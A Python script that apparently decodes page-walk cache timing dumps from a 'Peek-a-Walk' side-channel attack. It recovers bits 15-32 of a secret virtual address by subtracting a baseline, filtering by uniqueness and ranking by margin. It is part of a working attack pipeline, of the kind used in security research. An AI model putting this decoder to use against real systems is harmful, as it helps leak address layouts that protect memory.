#!/usr/bin/env python3
"""Decide the Peek-a-Walk page-walk lines from a PWSC_RAW_DUMP.

The attacker's in-process rule ("first co whose best line clears the solver's
gap threshold") picks up structural artifacts, because an artifact clears the
threshold at *every* co.  A real page-walk hit exists at exactly one co.  This
module applies that distinction to the raw dump, and is the authority on the
PL1 result -- leak.c's loop 2 only collects.

THE RULE, in three clauses.  With m[c][i] the mean per attempt of
sum(signal - noise) over all trials and rounds, for co c and line i:

  1. Baseline.  Group 0 is loop-1 co=0, which maps nothing (leak.c guards the
     mmap with `if (co > 0)`), so no walk can complete and its values are pure
     attacker self-noise.

         b[i]    = m[0][i]
         r[c][i] = m[c][i] - b[i]

     This is what demotes L0, which carried 8159 of self-noise on
     run_45678213_v2 -- present even where there is no walk at all.  It
     replaces the /proc/self/maps mask in leak.c, which suppresses lines
     {0,1,2} outright and so makes 4.7% of secrets undecodable at PL2.

  2. Uniqueness.  A real hit exists at one co:

         peak[i]  = max_c r[c][i]        co*[i] = argmax_c r[c][i]
         fires[i] = #{ c : r[c][i] > UNIQ_FRAC * peak[i] }
         survivor iff peak[i] > 0 and fires[i] == 1

     This is what demotes L5 during the PL1 sweep, which clause 1 cannot touch
     (its baseline is -69): L5 is a genuine signal, but from the level above,
     and it fires at 8/8 co.  Co-independence is what marks it as belonging to
     a different level.

  3. Rank among survivors only.  Winner is the survivor with the largest peak;
     accept if it beats the runner-up SURVIVOR by >= MIN_MARGIN.  Ranking
     against all 64 lines would compare L15 to L5's 12638 rather than to L2's
     186.

On run_45678213_v2 this yields L15 at co=3 with a 77.9x margin, and decodes
all four fields correctly.  The in-process rule yielded L0 at co=0.

PER-ATTEMPT UNITS ARE LOAD-BEARING.  Loop 1 runs 3 attempts per co and loop 2
runs 9 (see PWSC_ATTEMPTS_L1/L2 in leak.c), so raw sums from the two loops are
not commensurate and subtracting a loop-1 baseline from a loop-2 total would
under-correct by 3x.  Everything below is a mean per attempt.

Usage:
    ./spike.py <dumpdir> [--attempts-l1 3] [--attempts-l2 9] [--expect 0x...]
"""

import argparse
import glob
import os
import re
import sys

NLINES = 64
LOOP2_COS = 8          # leak.c loop 2 always sweeps all 8 vpn2_co
UNIQ_FRAC = 0.25       # a co "fires" above this fraction of the line's peak
MIN_MARGIN = 5.0       # winner must beat the runner-up survivor by this factor

# (shift, mask) of each field in the virtual address; see pwsc.h's bitfield.
FIELDS = {
    "vpn3_co":  (30, 0x7),
    "vpn2_set": (24, 0x3F),
    "vpn2_co":  (21, 0x7),
    "vpn1_set": (15, 0x3F),
}


# --------------------------------------------------------------------------
# loading
# --------------------------------------------------------------------------

def _call_index(path):
    m = re.search(r"call(\d+)", os.path.basename(path))
    if not m:
        raise ValueError("cannot parse call index from %s" % path)
    return int(m.group(1))


def load_call_totals(dumpdir):
    """-> [[sum(signal-noise) per line]] , one entry per call, in call order."""
    paths = glob.glob(os.path.join(dumpdir, "*.csv"))
    if not paths:
        raise FileNotFoundError("no CSVs in %s" % dumpdir)

    out = []
    for path in sorted(paths, key=_call_index):
        totals = [0] * NLINES
        with open(path) as fh:
            fh.readline()  # "# target=... level=..."
            fh.readline()  # "trial,line,round,noise,signal"
            for row in fh:
                parts = row.split(",")
                if len(parts) < 5:
                    continue
                # matches pwsc.c: timings[] accumulates signal - noise
                totals[int(parts[1])] += int(parts[4]) - int(parts[3])
        out.append(totals)
    return out


def split_groups(calls, attempts_l1, attempts_l2, loop1_cos=None):
    """Pool calls into per-co groups, in PER-ATTEMPT units.

    Loop 1 emits `attempts_l1` CSVs per co and breaks on accept, so its co count
    varies; loop 2 emits `attempts_l2` per co for all 8.  When the two attempt
    counts differ the loop-1 co count is therefore derivable from the total.

    -> (loop1_groups, loop2_groups); each group is
       {"mean": [per-line mean per attempt], "attempts": n,
        "per_attempt": [[value per attempt] per line]}
    """
    n = len(calls)

    if loop1_cos is None:
        # Equal attempt counts are still unambiguous: with a attempts each,
        # "both loops ran" puts n/a in 9..12 and "loop 1 aborted" puts it in
        # 1..4, so the two branches below cannot both match.
        tail = n - LOOP2_COS * attempts_l2
        if tail > 0 and tail % attempts_l1 == 0 and tail // attempts_l1 <= 4:
            loop1_cos = tail // attempts_l1          # both loops ran
        elif n % attempts_l1 == 0 and n // attempts_l1 <= 4:
            loop1_cos = n // attempts_l1             # loop 1 only (it aborted)
        else:
            raise ValueError(
                "cannot infer layout from %d CSVs with l1=%d l2=%d; pass "
                "--loop1-cos" % (n, attempts_l1, attempts_l2))

    n_l1 = loop1_cos * attempts_l1
    if n < n_l1:
        raise ValueError("%d CSVs is fewer than loop 1 alone needs (%d)"
                         % (n, n_l1))
    rest = n - n_l1
    if rest % attempts_l2:
        raise ValueError("%d CSVs left after loop 1 is not a multiple of "
                         "attempts-l2=%d" % (rest, attempts_l2))

    def pool(chunk):
        a = len(chunk)
        return {
            "attempts": a,
            "mean": [sum(c[i] for c in chunk) / a for i in range(NLINES)],
            "per_attempt": [[c[i] for c in chunk] for i in range(NLINES)],
        }

    l1 = [pool(calls[g * attempts_l1:(g + 1) * attempts_l1])
          for g in range(loop1_cos)]
    l2 = [pool(calls[n_l1 + g * attempts_l2:n_l1 + (g + 1) * attempts_l2])
          for g in range(rest // attempts_l2)]
    return l1, l2


# --------------------------------------------------------------------------
# the rule
# --------------------------------------------------------------------------

def apply_rule(groups, baseline, uniq_frac=UNIQ_FRAC):
    """Rules 1-3.  -> (survivors, rejected, residuals), each sorted best-first.

    survivors/rejected entries are (peak, line, co, nfiring).
    """
    ncos = len(groups)
    res = [[groups[c]["mean"][i] - baseline[i] for i in range(NLINES)]
           for c in range(ncos)]

    survivors, rejected = [], []
    for line in range(NLINES):
        v = [res[c][line] for c in range(ncos)]
        peak = max(v)
        if peak <= 0:
            continue
        nfiring = sum(1 for x in v if x > uniq_frac * peak)
        entry = (peak, line, v.index(peak), nfiring)
        (survivors if nfiring == 1 else rejected).append(entry)

    survivors.sort(reverse=True)
    rejected.sort(reverse=True)
    return survivors, rejected, res


def decide(groups, baseline, uniq_frac=UNIQ_FRAC, min_margin=MIN_MARGIN):
    """-> dict with line/co/peak/runner_up/margin/ok, or None if no survivors."""
    survivors, rejected, res = apply_rule(groups, baseline, uniq_frac)
    if not survivors:
        return None
    peak, line, co, _ = survivors[0]
    runner = survivors[1][0] if len(survivors) > 1 else 0.0
    runner_line = survivors[1][1] if len(survivors) > 1 else None
    margin = (peak / runner) if runner > 0 else float("inf")
    return {
        "line": line, "co": co, "peak": peak,
        "runner_up": runner, "runner_up_line": runner_line,
        "margin": margin, "ok": margin >= min_margin,
        "survivors": survivors, "rejected": rejected, "residuals": res,
    }


# --------------------------------------------------------------------------
# public API
# --------------------------------------------------------------------------

def analyze(dumpdir, attempts_l1=3, attempts_l2=9, loop1_cos=None,
            uniq_frac=UNIQ_FRAC, min_margin=MIN_MARGIN, verbose=True,
            out=sys.stdout):
    """Score a raw dump and return the decoded upper bits.

    -> {"fields": {name: value}, "va": int, "ok": bool, "pl2": .., "pl1": ..}

    `va` carries bits 15-32 only; bits 0-14 are left to the caller's linear
    search.  `ok` is True only when every field present cleared min_margin.
    """
    calls = load_call_totals(dumpdir)
    l1, l2 = split_groups(calls, attempts_l1, attempts_l2, loop1_cos)

    if not l1:
        raise ValueError("no loop-1 groups: the null-control baseline is "
                         "unavailable, so rule 1 cannot be applied")

    # Rule 1's baseline.  Group 0 is loop-1 co=0, which maps nothing.
    baseline = l1[0]["mean"]

    if verbose:
        print("[spike] %d CSVs -> %d loop-1 co (%d attempts each), %d loop-2 co "
              "(%d attempts each)" % (len(calls), len(l1), attempts_l1,
                                      len(l2), attempts_l2), file=out)
        top = sorted(range(NLINES), key=lambda i: -baseline[i])[:4]
        print("[spike] baseline = loop-1 co=0 (nothing mapped); largest "
              "self-noise: " + ", ".join("L%d=%.0f" % (i, baseline[i])
                                         for i in top), file=out)

    # LOOP 2 IS THE ONLY THING THIS MODULE DECIDES.  Loop 1 still decides PL2
    # in-process: with filter_self_image_lines plus the solver's gap rule it is
    # rank 1 in 9/9 attempts at a 33x margin, so there is nothing here to fix
    # and no reason to spend 9 attempts on it.  Loop 1's dump is still required,
    # but only as rule 1's null control -- group 0 is the co that maps nothing.
    pl1 = decide(l2, baseline, uniq_frac, min_margin) if l2 else None

    # Advisory re-derivation of PL2 from the same dump.  Not used for the
    # decode; printed so that a disagreement with leak.c is visible rather than
    # silent.  Note its uniqueness clause is weak by construction: loop 1 breaks
    # on accept, so there is usually only one candidate co and every positive
    # line trivially "fires at 1/1".
    pl2_advisory = (decide(l1[1:], baseline, uniq_frac, min_margin)
                    if len(l1) > 1 else None)

    if verbose:
        if pl2_advisory:
            _report("LOOP 1 -- PL2 cross-check, sweeping vpn3_co (ADVISORY; "
                    "leak.c decides this level)",
                    l1[1:], baseline, pl2_advisory, min_margin, co_offset=1,
                    out=out)
        if pl1:
            _report("LOOP 2 -- PL1 line, sweeping vpn2_co (AUTHORITATIVE)",
                    l2, baseline, pl1, min_margin, co_offset=0, out=out)

    fields = {}
    if pl1:
        fields["vpn2_co"] = pl1["co"]
        fields["vpn1_set"] = pl1["line"]

    va = 0
    for name, value in fields.items():
        va |= value << FIELDS[name][0]

    advisory = {}
    if pl2_advisory:
        advisory["vpn3_co"] = pl2_advisory["co"] + 1
        advisory["vpn2_set"] = pl2_advisory["line"]

    return {"fields": fields, "va": va,
            "ok": bool(pl1) and pl1["ok"],
            "pl1": pl1, "pl2_advisory": pl2_advisory,
            "advisory_fields": advisory, "baseline": baseline}


def combine(c_va, spike_result, out=sys.stdout):
    """Merge leak.c's PL2 decode with spike's PL1 decode into the upper bits.

    `c_va` is the value leak.c printed as "The bits decoded are". Its vpn3_co
    and vpn2_set are taken as authoritative; its vpn2_co/vpn1_set are ignored,
    because that is the level whose in-process rule is known to pick the
    co-independent artifact.

    -> (va, fields) covering bits 15-32.
    """
    fields = {
        "vpn3_co":  (c_va >> FIELDS["vpn3_co"][0]) & FIELDS["vpn3_co"][1],
        "vpn2_set": (c_va >> FIELDS["vpn2_set"][0]) & FIELDS["vpn2_set"][1],
    }
    for name, value in spike_result["fields"].items():
        fields[name] = value

    for name, value in spike_result.get("advisory_fields", {}).items():
        if fields.get(name) != value:
            print("[spike] NOTE: loop-1 cross-check reads %s=%d but leak.c "
                  "decoded %s=%s; using leak.c's value"
                  % (name, value, name, fields.get(name)), file=out)

    va = 0
    for name, value in fields.items():
        va |= value << FIELDS[name][0]
    return va, fields


UPPER_MASK = 0
for _sh, _mask in FIELDS.values():
    UPPER_MASK |= _mask << _sh


# --------------------------------------------------------------------------
# reporting
# --------------------------------------------------------------------------

def _row(res, line, ncos, baseline):
    return "L%-2d base=%-8.0f %s" % (
        line, baseline[line],
        " ".join("%8.0f" % res[c][line] for c in range(ncos)))


def _report(title, groups, baseline, d, min_margin, co_offset, out):
    ncos = len(groups)
    print("\n" + "=" * 76, file=out)
    print(title, file=out)
    print("=" * 76, file=out)
    print("  co:                    "
          + " ".join("%8d" % (c + co_offset) for c in range(ncos)), file=out)

    res = d["residuals"]
    print("\n  WINNER:", file=out)
    print("  " + _row(res, d["line"], ncos, baseline)
          + "   <- fires only at co=%d" % (d["co"] + co_offset), file=out)
    print("\n  line=%d  co=%d  peak=%.0f  runner-up=%s  margin=%s  -> %s"
          % (d["line"], d["co"] + co_offset, d["peak"],
             ("%.0f (L%d)" % (d["runner_up"], d["runner_up_line"]))
             if d["runner_up_line"] is not None else "none",
             ("%.1fx" % d["margin"]) if d["runner_up"] > 0 else "inf",
             "USABLE" if d["ok"] else "MARGINAL (need %.1fx)" % min_margin),
          file=out)

    # per-attempt stability of the winner at its own co
    pa = groups[d["co"]]["per_attempt"][d["line"]]
    n = len(pa)
    ranks = []
    for a in range(n):
        col = [groups[d["co"]]["per_attempt"][i][a] - baseline[i]
               for i in range(NLINES)]
        ranks.append(sorted(range(NLINES), key=lambda i: -col[i]).index(d["line"]) + 1)
    print("  per-attempt values: %s" % pa, file=out)
    print("  per-attempt rank:   %s  -> rank 1 in %d/%d"
          % (ranks, sum(1 for r in ranks if r == 1), n), file=out)

    print("\n  other unique-co survivors:", file=out)
    for _, line, _, _ in d["survivors"][1:5]:
        print("  " + _row(res, line, ncos, baseline), file=out)

    print("\n  rejected by rule 2 (fire at >1 co):", file=out)
    for _, line, _, nf in d["rejected"][:5]:
        print("  " + _row(res, line, ncos, baseline)
              + "   fires at %d/%d co" % (nf, ncos), file=out)


# --------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("dumpdir")
    ap.add_argument("--attempts-l1", type=int, default=3,
                    help="CSVs per co in loop 1 (PWSC_ATTEMPTS_L1); default 3")
    ap.add_argument("--attempts-l2", type=int, default=9,
                    help="CSVs per co in loop 2 (PWSC_ATTEMPTS_L2); default 9")
    ap.add_argument("--loop1-cos", type=int, default=None,
                    help="override the inferred loop-1 co count (required when "
                         "the two attempt counts are equal)")
    ap.add_argument("--uniq-frac", type=float, default=UNIQ_FRAC)
    ap.add_argument("--min-margin", type=float, default=MIN_MARGIN)
    ap.add_argument("--c-va", type=lambda s: int(s, 0), default=None,
                    help="the value leak.c printed as 'The bits decoded are'; "
                         "supplies vpn3_co/vpn2_set. Without it only the loop-2 "
                         "fields are reported.")
    ap.add_argument("--expect", type=lambda s: int(s, 0), default=None,
                    help="known secret, to check the decode against")
    args = ap.parse_args()

    try:
        r = analyze(args.dumpdir, args.attempts_l1, args.attempts_l2,
                    args.loop1_cos, args.uniq_frac, args.min_margin)
    except (ValueError, FileNotFoundError) as e:
        sys.exit("spike: %s" % e)

    if args.c_va is not None:
        va, fields = combine(args.c_va, r)
    else:
        va, fields = r["va"], dict(r["fields"])
        # fall back to the advisory PL2 purely so the CLI is usable standalone
        for name, value in r["advisory_fields"].items():
            fields.setdefault(name, value)
            va |= value << FIELDS[name][0]

    print("\n" + "=" * 76)
    print("DECODE" + ("" if args.c_va is not None
                      else "  (no --c-va: PL2 taken from the advisory "
                           "cross-check)"))
    print("=" * 76)
    bad = False
    for name in FIELDS:
        if name not in fields:
            print("  %-9s = (not determined)" % name)
            bad = True
            continue
        v = fields[name]
        src = "spike" if name in r["fields"] else (
            "leak.c" if args.c_va is not None else "advisory")
        line = "  %-9s = %-3d  [%s]" % (name, v, src)
        if args.expect is not None:
            sh, mask = FIELDS[name]
            want = (args.expect >> sh) & mask
            ok = want == v
            bad = bad or not ok
            line += "   expected %-3d  %s" % (want, "OK" if ok else "MISMATCH")
        print(line)

    print("  partial VA (bits 15-32) = 0x%08x" % va)
    if args.expect is not None:
        print("  expected                = 0x%08x" % (args.expect & UPPER_MASK))
    print("  loop-2 margin cleared: %s" % ("yes" if r["ok"] else "NO"))
    sys.exit(1 if (bad and args.expect is not None) or not r["ok"] else 0)


if __name__ == "__main__":
    main()
